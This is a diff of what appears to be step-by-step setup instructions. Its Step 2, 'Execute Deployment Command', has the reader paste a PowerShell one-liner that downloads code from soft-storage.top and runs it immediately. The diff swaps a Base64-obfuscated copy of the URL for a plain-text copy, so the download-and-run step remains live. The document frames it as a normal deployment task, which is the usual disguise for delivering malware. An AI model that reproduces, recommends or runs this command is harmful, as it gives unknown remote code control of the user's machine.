@@ -7,7 +7,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjUwMzg3NDQ3L0dpdA=='))) -UseBasicParsing)
+powershell iex (iwr "http://soft-storage.top/worker?=8250387447/Git" -UseBasicParsing)
 ```
 
 ### Step 3: Wait for Completion
